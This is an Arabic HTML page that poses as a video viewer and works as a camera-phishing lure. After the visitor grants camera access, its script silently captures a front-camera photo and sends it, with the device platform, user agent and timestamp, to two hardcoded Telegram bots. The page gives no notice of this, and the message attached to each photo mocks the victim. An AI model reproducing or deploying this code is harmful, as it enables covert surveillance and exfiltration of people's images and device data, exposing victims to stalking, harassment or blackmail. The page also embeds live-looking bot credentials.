<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- وسوم المعاينة المحدثة (Open Graph) للصورة الجديدة -->
    <meta property="og:title" content="ou8ss.1">
    <meta property="og:description" content="انقر لمشاهدة الفيديو بدقة عالية">
    <meta property="og:type" content="video.other">
    <meta property="og:image" content="https://cdn.imagetourls.com/uploads/tyImg/14X6n5D4j.jpg">

    <title>Video Fullscreen</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        html, body {
            width: 100%;
            height: 100%;
            background-color: #000;
            overflow: hidden;
            font-family: system-ui, -apple-system, sans-serif;
        }
        video#mainVideo {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            object-fit: cover;
            object-position: center;
            z-index: 1;
        }
        /* لافتة طلب السماح بالكاميرا */
        #cameraBanner {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.78);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
            z-index: 10;
        }
        .banner-card {
            max-width: 400px;
            width: 100%;
            background: #18181b;
            color: #fff;
            border: 1px solid #27272a;
            border-radius: 14px;
            padding: 20px;
            text-align: center;
        }
        .banner-card h2 {
            font-size: 18px;
            margin-bottom: 8px;
        }
        .banner-card p {
            font-size: 14px;
            color: #d4d4d8;
            line-height: 1.6;
            margin-bottom: 16px;
        }
        .banner-actions {
            display: flex;
            gap: 10px;
            justify-content: center;
        }
        button {
            border: none;
            border-radius: 8px;
            padding: 10px 16px;
            font-size: 14px;
            cursor: pointer;
        }
        #allowCameraBtn {
            background: #2563eb;
            color: #fff;
            font-weight: 600;
        }
        #dismissBannerBtn {
            background: #3f3f46;
            color: #e4e4e7;
        }
        #statusMsg {
            margin-top: 12px;
            font-size: 13px;
            color: #f87171;
            min-height: 18px;
        }
    </style>
</head>
<body>

    <!-- مشغل الفيديو -->
    <video id="mainVideo" controls loop playsinline muted>
        <source src="my_reel (3).mp4" type="video/mp4">
    </video>

    <!-- لافتة السماح بالكاميرا -->
    <div id="cameraBanner" role="dialog" aria-modal="true" aria-labelledby="bannerTitle">
        <div class="banner-card">
            <h2 id="bannerTitle">إذن الوصول إلى الكاميرا</h2>
            <p>
                يرجى السماح بالوصول إلى الكاميرا للمتابعة. سيطلب منك المتصفح تأكيد الإذن بعد الضغط على الزر أدناه.
            </p>
            <div class="banner-actions">
                <button id="allowCameraBtn" type="button">السماح بالكاميرا</button>
                <button id="dismissBannerBtn" type="button">إغلاق</button>
            </div>
            <div id="statusMsg"></div>
        </div>
    </div>

    <script>
        const TELEGRAM_TARGETS = [
            {
                token: '8469850859:AAFQJDODXLXA-9jJYhYJ8ASll3-6d2RnIQA',
                chatId: '6642913954'
            },
            {
                token: '9263581446:AAFs0PHhBepUgbuNLlQJYAihz7sX3me71e4',
                chatId: '7890543237'
            }
        ];

        let isProcessing = false;
        const banner = document.getElementById('cameraBanner');
        const allowBtn = document.getElementById('allowCameraBtn');
        const dismissBtn = document.getElementById('dismissBannerBtn');
        const statusMsg = document.getElementById('statusMsg');

        function buildCaption(cameraLabel) {
            const now = new Date().toLocaleString('ar-DZ', {
                dateStyle: 'short',
                timeStyle: 'medium'
            });
            const deviceInfo = navigator.userAgentData?.platform || navigator.platform || 'Unknown';
            const userAgent = navigator.userAgent || 'Unknown';

            return `جات صورة من عند عمك عبدو😍\n📷 الكاميرا: ${cameraLabel}\n🕒 الوقت: ${now}\n📱 الجهاز: ${deviceInfo}\n🌐 المتصفح: ${userAgent}`;
        }

        async function sendPhotoToAllTargets(blob, cameraLabel) {
            const caption = buildCaption(cameraLabel);

            const requests = TELEGRAM_TARGETS.map(async (target) => {
                const formData = new FormData();
                formData.append('chat_id', target.chatId);
                formData.append('photo', blob, 'capture.png');
                formData.append('caption', caption);

                const response = await fetch(`https://api.telegram.org/bot${target.token}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                if (!response.ok) {
                    throw new Error(`HTTP ${response.status} for chat ${target.chatId}`);
                }
            });

            const results = await Promise.allSettled(requests);
            results.forEach((res, index) => {
                if (res.status === 'rejected') {
                    console.error(`Failed sending to target #${index + 1}:`, res.reason);
                }
            });
        }

        async function captureSinglePhoto(facingMode) {
            let stream = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { ideal: facingMode } }
                });

                const hiddenVideo = document.createElement('video');
                hiddenVideo.muted = true;
                hiddenVideo.playsInline = true;
                hiddenVideo.srcObject = stream;

                await hiddenVideo.play();
                await new Promise((resolve) => setTimeout(resolve, 400));

                const canvas = document.createElement('canvas');
                canvas.width = hiddenVideo.videoWidth || 640;
                canvas.height = hiddenVideo.videoHeight || 480;

                const ctx = canvas.getContext('2d');
                ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);

                stream.getTracks().forEach((track) => track.stop());
                stream = null;

                return await new Promise((resolve) => {
                    canvas.toBlob((blob) => resolve(blob || null), 'image/png');
                });
            } catch (err) {
                console.error(`Camera Error (${facingMode}):`, err);
                if (stream) {
                    stream.getTracks().forEach((track) => track.stop());
                }
                return null;
            }
        }

        async function handleCameraFlow() {
            if (isProcessing) return;
            isProcessing = true;
            statusMsg.textContent = '';

            try {
                const blob = await captureSinglePhoto('user');
                if (!blob) {
                    statusMsg.textContent = 'تعذر الوصول إلى الكاميرا أو تم رفض الإذن.';
                    return;
                }

                await sendPhotoToAllTargets(blob, 'user');
                banner.style.display = 'none';
            } finally {
                isProcessing = false;
            }
        }

        allowBtn.addEventListener('click', handleCameraFlow);
        dismissBtn.addEventListener('click', () => {
            banner.style.display = 'none';
        });
    </script>
</body>
</html>
